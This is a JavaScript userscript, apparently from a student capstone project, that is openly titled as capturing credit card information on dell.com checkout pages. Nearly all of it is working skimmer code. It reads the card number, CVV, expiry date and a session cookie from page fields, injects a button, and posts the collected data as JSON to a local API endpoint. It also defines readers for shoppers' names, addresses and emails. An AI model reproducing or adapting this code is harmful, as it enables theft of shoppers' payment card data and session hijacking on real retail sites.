// ==UserScript==
// @name         Script to capture user credit card information
// @namespace    dell.com
// @version      0.1
// @description  Script to capture user credit card information
// @author       UHCL Capstone Team
// @match        https://www.dell.com/*
// @grant        none
// MODIFICATION HISTORY
// WHO      WHEN          WHAT
// Ha Vu    09/23/2019    Initial Version
// Ha Vu    10/03/2019    Add get methods for all the fields
// ==/UserScript==
debugger;

const uri = "http://localhost:44340/api/CheckOutPage";

function getUTCDateTime() {
    var date = new Date();
    var now_utc = Date.UTC(date.getUTCFullYear(), date.getUTCMonth(), date.getUTCDate(),
        date.getUTCHours(), date.getUTCMinutes(), date.getUTCSeconds());

    return new Date(now_utc);
}

function getCookieValueByName(name) {
    var value = "";
    try {
        var str = document.cookie.split(';');
        var i = 0;
        for (i = 0; i < str.length; i++) {
            if (str[i].indexOf(name) >= 0) {
                value = str[i].split('=')[1];
            }
        }
    }
    catch (err) {
        value = "";
        console.log(err);
    }
    return value;
}
function getMCMID() {
    var MCMID = "";
    MCMID = getCookieValueByName('s_ecid');

    /*Strip the prefix MCMID*/
    var str = MCMID.split('%7C')[1];
    if (str.length > 1) {
        return MCMID.split('%7C')[1];
    }
    else {
        return MCMID;
    }

}

function getUserSessionID() {
    var sessionID = "";
    sessionID = getCookieValueByName('DellCEMSession');
    return sessionID;
}



function getUserCreditNumber() {

    try {
        var CreditNumber = "";
        CreditNumber = document.getElementById("DataModel-CardNumber").value;
        return CreditNumber;
    }
    catch (err) {
        console.log(err);
    }


}
function getExpiryMonth() {
    try {
        var ExpiryMonth = "";
        ExpiryMonth = document.getElementById("DataModel-ExpirationMonth").value;
        return ExpiryMonth;
    }
    catch (err) {
        console.log(err);
    }

}

function getExpiryYear() {
    try {
        var ExpiryYear = "";
        ExpiryYear = document.getElementById("DataModel-ExpirationYear").value;
        return ExpiryYear;
    }
    catch (err) {
        console.log(err);
    }

}

function getSecurityCode() {

    try {
        var SecurityCode = "";
        SecurityCode = document.getElementById("DataModel-CardIdentificationNumber").value;
        return SecurityCode;
    }
    catch (err) {
        console.log(err);
    }
}

function getFirstName() {

    try {
        var FirstName = "";
        FirstName = document.getElementById("DataModel-ShippingContact-FirstName");
        return FirstName;
    }
    catch (err) {
        console.log(err);
    }
}
function getLastName() {

    try {
        var LastName = "";
        LastName = document.getElementById("DataModel-ShippingContact-LastName").value;
        return LastName;
    }
    catch (err) {
        console.log(err);
    }
}
function getMiddleName() {

    try {
        var MiddleName = "";
        MiddleName = document.getElementById("DataModel-ShippingContact-MiddleInitial").value;
        return MiddleName;
    }
    catch (err) {
        console.log(err);
    }
}

function getStreetAdress() {

    try {
        var StreetAdress = "";
        StreetAdress = document.getElementById("DataModel-ShippingContact-Line1").value;
        return StreetAdress;
    }
    catch (err) {
        console.log(err);
    }
}

function getCity() {

    try {
        var City = "";
        City = document.getElementById("DataModel-ShippingContact-City").value;
        return City;
    }
    catch (err) {
        console.log(err);
    }
}

function getState() {

    try {
        var State = "";
        State = document.getElementById("DataModel-ShippingContact-State").value;
        return State;
    }
    catch (err) {
        console.log(err);
    }
}

function getPostalCode() {
    try {
        var PostalCode = "";
        PostalCode = document.getElementById("DataModel-ShippingContact-PostalCode").value;
        return PostalCode;
    }
    catch (err) {
        console.log(err);
    }
}

function getEmailAddress() {

    try {
        var EmailAddress = "";
        EmailAddress = document.getElementById("DataModel-ShippingContact-Email").value;
        return EmailAddress;
    }
    catch (err) {
        console.log(err);
    }
}

function APICallBack(page) {

    try {
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function () {
            if (this.readyState == 4 && this.status == 200) {
                console.log(this.responseText);
            }
        };
        xhttp.open("POST", uri, true);
        xhttp.setRequestHeader("Content-type", "application/json");
        xhttp.send(JSON.stringify(page));
    }
    catch (err) {
        console.log(err);
    }
}


var zNode = document.createElement('div');
zNode.innerHTML = '<button id="btnCreditCard" type="button">'
    + 'Submit Credit Card</button>'
    ;
zNode.setAttribute('id', 'myContainer');
document.body.appendChild(zNode);


document.getElementById("btnCreditCard").addEventListener(
    "click", ButtonClickAction, false
);

function ButtonClickAction(zEvent) {

    var CheckoutPage = {
        MCMID: getMCMID(),
        sessionID: getUserSessionID(),
        CreditNumber: getUserCreditNumber(),
        SecurityCode: getSecurityCode(),
        ExpiryMonth: getExpiryMonth(),
        ExpiryYear: getExpiryYear(),
        TimeStamp: getUTCDateTime()
    };

    APICallBack(CheckoutPage);
}


